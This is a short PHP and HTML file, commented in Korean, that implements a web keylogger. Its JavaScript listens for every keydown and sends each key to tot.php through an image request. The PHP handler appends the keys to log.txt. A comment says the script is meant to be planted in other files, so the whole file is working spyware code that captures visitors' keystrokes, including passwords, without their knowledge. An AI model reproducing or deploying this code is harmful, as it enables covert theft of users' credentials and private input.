<?php // tot.php
if (isset($_GET['key'])) {
    $key = $_GET['key'].' ';           // 엔터,백스페이스/일반알파벳 구분을 위해 입력마다 공백넣어주기
    file_put_contents('log.txt', $key, FILE_APPEND); // log.txt.에 $key문자를 이어쓰기(FILE_APPEND)
    exit(); 
}
?>

<!DOCTYPE html> 
<html lang="en">
<head>
    <meta charset="UTF-8">
</head>
<body>
    <script> //다른 파일에 심을 자바스크립트 코드 
    document.addEventListener('keydown', //Keydown 발생마다 
        function(k){ //변수k에 keydown에 대한 정보가 담겨있음
        new Image().src = "tot.php?key=" + k.key;} //키 값을 서버로 전송
    );
    </script>
</body>
</html>
